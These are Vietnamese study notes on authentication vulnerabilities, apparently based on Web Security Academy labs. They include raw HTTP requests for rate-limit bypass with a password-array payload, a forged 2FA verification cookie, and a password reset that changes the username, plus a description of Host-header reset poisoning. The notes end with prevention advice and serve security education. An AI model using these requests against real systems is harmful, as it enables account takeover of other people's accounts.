# Authentication

## What is authentication ?

Là bước thứ hai trong flow  :  **identify** →  **authentication**  →  **authorization** 

Là bước xác minh tính chân thực của đối tượng , có 3 cách thường để dùng triển khai trong authentication 

- `You know` :  Những gì bạn biết :  Ví dụ là mật khẩu , mã pin  < `knowledge factor` > :  yếu tố kiến thức
- `You have` :  Những gì bạn có , mang tính vật lý  : Ví dụ như mã OTP , số điện thoại , `<possession factor`> :  yếu tố sử hữu
- `You are` :  Những gì bạn là hoặc đang làm  :  Ví dụ như sinh trắc học  <  `Inherence  factor` >  yếu tố vốn có

## What is the bug  ?

Lỗ hổng authentication là lỗi giúp kẻ tấn công cú  thể vượt qua cơ chế xác thực , giả mạo được người dùng hợp lệ , truy cập được các thông tin và chức năng nhạy cảm \

## Where bug occur in web site  ?

Lỗ hổng authentication xảy ra trong các chức năng mà dùng để xác minh tính chân thực của đối tượng 

Và xảy ra thường là 1 trong 2 case sau : 

- `Cơ chế xác thực yếu` , không chống được tấn công vén cạn  < brute-force > , chống tấn công không đầy đủ
- `Lỗi logic` trong cách triển khai cơ chế xác thực khiến cho attacker có thể bypass được

## **What is the impact of vulnerable authentication?**

- Chiếm đoạt được các tài nguyên của người dùng khác
- Mở rộng attack surface phục vụ cho các cuộc tấn công khác

## **Vulnerabilities in authentication mechanisms**

Ở hầu hết các webapp thì thường triển khai 3 cơ chế trong việc xác thực tính chân thực của đối tượng , hay thường gọi là end-user 

1. `Password based login` 
2. `Multi-factor authentication` 
3. `Other authentication` 

## How to test  ?

### Password based login

Ở cơ chế này thì cơ chế xác thực tính chân thực của đối tượng dựa cơ chế xác thức là `you know`   bạn cung cấp một giá trị bí mật mà chỉ mình bạn biết gọi là `password` 

Với cơ chế xác thực này thì gặp các lỗi liên quan đến tấn công vét cạn , nếu không có cơ chế bảo vệ đầy đủ thì rất có thể attacker có thể chiếm quyền điều khiển của các tài khoản khác .

1. **User enumeration** 

Lỗi này cho phép attacker có thể thu thập được các user hợp lệ trong hệ thống dựa vào 4 yếu tố :

- `Status code`  :  Hầu hết các lần thử trong tấn công vét cạn đều trả về 1 status code , nếu mà khi đoán đúng thì nó maybe sẽ trả về 1 status khác , ví dụ như 302 :
- `Error message` :  “username incorrect “  ⇒ “password incorrect”
- `Response time`  : Ví dụ nếu như dev code rằng chỉ check mật khẩu nếu như username đúng , vậy giờ mình truyền 1 chuỗi mật khẩu rất dài , và xem response time của từng username , nếu cái khác có thời gian sử lý dài bất thường ⇒  maybe valid username
1. Những sai lầm khi triển khai cơ chế chống tấn công vét cạn đối với hình thức này 

Có hai cơ chế thường được sử dụng là  : 

1. User rate limit 
2. Locking account 
3. Other measure < blocking Ip address > 

Cả hai cơ chế đều hiệu quả nhưng nếu không triển khai với logic đúng thì nó vẫn có thể vượt qua 

### Locking Account

Cách triển khai :  

Cơ chế này sẽ khóa 1 tài khoản nếu tài khoản đó thực hiện xác minh đăng nhập sai số quá lần cho phép .

Các tài khoản này có thể bị khóa trong 1 thời gian nhất định hoặc đợi đến khi administrator mở khóa thủ công 

**Các vấn đề với các bảo vệ này  :** 

1. Cả tấn công có thể mở một việc tấn công từ chối dịch vụ , bằng việt thử sai một số lượng lớn username tài khoản của người dùng hợp lệ , rồi khiến nó bị khóa ⇒ DOS 
2. Chỉ thực hiện khóa được với các tài khoản đã tồn tại trong hệ thống 

⇒ Nếu tài khoản đó `tồn tại` thì error message  ⇒ `“This account will be locking in 30 min , try again !`”  , nếu tài khoản không tồn tại thì không có message lỗi ⇒ từ đó có thể dẫn đến `username enumeration`   

1. Không chống được spayring attack

Đó là sử dụng 1 lượng ít mật khẩu phổ biến , default password , rồi dò quét trên một lượng lớn các tài khoản , vì nó không vượt qua số lần thử sai nên không bị khóa , nên kiểu tấn công này hoàn toàn có thể bypass được cơ chế này

### User rate limit

Cách triển khai : 

Khi có một lượng lớn yêu cầu xác thực được gửi đến trong một thời gian nhắn , IP address sẽ được khóa lại , nó sẽ được mở lại bằng một số cơ chế sau : 

- Được mở khóa sau một khoảng thời gian
- Thủ công bởi administrator
- Hoàn thành CAPCHA

Ví dụ lỗi logic trong triển khai  : 

Ở dưới back end , nhập 1 `json` từ phía client gửi lên , bao gồm mật khẩu và usernaame 

```sql
POST /login HTTP/2
Host: 0a59008904fb912684ffe260002c00f5.web-security-academy.net
Cookie: session=N0QaqeaDVpmukvTKKpkUZQNCkGCTQhBF
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a59008904fb912684ffe260002c00f5.web-security-academy.net/login
Content-Type: application/json
Content-Length: 36
Origin: https://0a59008904fb912684ffe260002c00f5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"wiener","password":"peter"}
```

 

Sẽ ra sao nếu mình gửi mình có thể truyền 1 array vào vào giá trị password  

```sql
{"username":"carlos","password":[
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop",
    "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000",
    "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey",
    "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111",
    "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger",
    "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew",
    "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow"
  ]
```

### **Multi-factor authentication**

Đây là cơ chế xác thực nhiều yếu tố , kết hợp giữa `you know` và `you have` 

Ở trên chỉ dựa vào **yếu tố bí mật** là password thì gọi là `single factor authentication` 

Hay thường được gọi là (2FA) , phổ biến nhất chính là `password`  + `OTP` 

password chính là you know và OTP là mã định danh secret token được gửi về thiết bị mà bạn sử hữu 

**Một số cách triển khai**  

1. Triển khai qua SMS 

Sau khi người dùng thực hiện đăng nhập lần đầu , bước tiếp theo cần phải nhập secret token được gửi về mobile phone để verify bước tiếp theo 

1. Triển khai qua email 

Tương tự như ở trên 

**Một số trường hợp triển khai sai logic** 

1. **Set phiên đăng nhập ở lần verify đầu tiên**  

Kịch bản :  Ứng dụng triển khai cơ chế xác thực hai yếu tố qua Email 

Lần 1 : username + password 

Lần 2 :  Secret code 

VD :

Sau lần đăng nhập 1  ⇒  được set 1 giá trị phiên 

![Untitled](Authentication%208f7d70c3e91e4ef8a20c731eac933c0f/Untitled.png)

Sau đó sang bước 2 ⇒  ta lại được set một giá trị phiên khác 

![Untitled](Authentication%208f7d70c3e91e4ef8a20c731eac933c0f/Untitled%201.png)

Triển khai sai logic ở đây , ta có thể hoàn toàn bỏ qua lần 2 , vì ta đã có phiên đăng nhập ở lần 1 

1. **Triển khai 2FA không verify đã xác thực được bước 1** 

Một số trường hợp verify dựa vào cookie chứa user , chỉ handle bước secret code mà không quan tâm đối tượng đó đã hoàn thành bước 1 xác thực username và password hay chưa 

```sql
POST /login2 HTTP/2
Host: 0a12007b04baaae385987d0500c7007d.web-security-academy.net
Cookie: session=; verify=carlos
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: https://0a12007b04baaae385987d0500c7007d.web-security-academy.net
Referer: https://0a12007b04baaae385987d0500c7007d.web-security-academy.net/login2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

mfa-code=1400
```

Giá trị cookie chứa đối tượng cần verify ⇒ brure-force 

### Other authentication

Ngoài các trang login ra thì còn rất nhiều các chức năng mà có thể phá vỡ được cơ chế xác thực , ví dụ như chức năng `reset password` 

Cách triển khai : 

Để triển khai chức năng reset password thì người ta thường triển khai bằng cách gửi 1 URL đến email đăng kí của user , từ url đó sẽ access được 1 page dùng để submit mật khẩu mới .

Ví dụ như : 

```sql
https://0a8000d604b65d8680bd85b10072004d.web-security-academy.net/forgot-password
//?temp-forgot-password-token=48zd6yx8i79padr5aquk20gnypwx4rqv
```

dãy token đằng sau thường được để đại diện cho 1 user và có nó chúng ta mới access được form dùng để `reset password` 

Một số vấn đề có thể xảy ra trong trường hợp này : 

1. Token chỉ được dùng để access page 

```sql
POST /forgot-password?temp-forgot-password-token=48zd6yx8i79padr5aquk20gnypwx4rqv HTTP/2
Host: 0a8000d604b65d8680bd85b10072004d.web-security-academy.net
Cookie: session=BhA3kvQoyfJDXZ99zpfwKKISa7Jsr4zo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Origin: https://0a8000d604b65d8680bd85b10072004d.web-security-academy.net
Referer: https://0a8000d604b65d8680bd85b10072004d.web-security-academy.net/forgot-password?temp-forgot-password-token=48zd6yx8i79padr5aquk20gnypwx4rqv
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=48zd6yx8i79padr5aquk20gnypwx4rqv&username=carlos&new-password-1=hihi&new-password-2=hihi
```

Trường hợp trên mục đích của token chỉ để làm cho request valid ⇒  đối tượng cần được reset password thì được truyền qua tham số `username`  dẫn đến mình có thể dễ dàng reset được password của người khác 

Cách khác phục :  Sử dụng jwt cho trường hợp này 

1. **Password reset** **poisoning**  

Cách triển khai : 

Người dùng nhập email hoặc username có liên kết với tài khoản , sau đó hệ thống sẽ gửi về url chứa token để access vào form đặt lại mật khẩu 

Url = `domainname/forget-password?token=secret-token`    ⇒ link = [domain.net/forge-passowrd?user=token](http://domain.net/forge-passowrd?user=token) 

Giá trị domain name thường được lấy từ giá trị HOST header từ HTTP request < trong trường hợp URL reset password được tạo ra một cách động > 

Vấn đề  : 

Nếu thao túng được giá trị `Host` mà phía back end nhận được thì sẽ dẫn đến lỗi `password reset poisoning` 

Một số Header dùng để thao túng giá trị HOST như :

- *X-Forwarded-Host*
- Forwarded

Ví dụ  :

![Untitled](Authentication%208f7d70c3e91e4ef8a20c731eac933c0f/Untitled%202.png)

Ở phía server sẽ lấy giá trị Từ header  `X-Forwarded-Host`   rồi nối với các giá trị token tạo thành URL rồi gửi vào email phía victim ⇒ nếu victim click vô đường dẫn thì phía server do attacker controlled sẽ nhận được secret token từ đó tiến hành reset password của victim ⇒ chiếm quyền điều khiển tài khoản 

## How to prevent ?

- Không làm lộ thông tin thông tin xác thực người dùng như username
- Triển khai chính xách mật khẩu mạnh
- ngăn chặn username enumeration ⇒ sử dụng các thông báo lỗi chung
- Triển khai cơ chế mạnh mẽ chống tấn công brute-force
1. User based rate limit ⇒ using CAPCHA with every login với một số lần thử sai nhất định 
- Triển khai xác thực đa yếu tố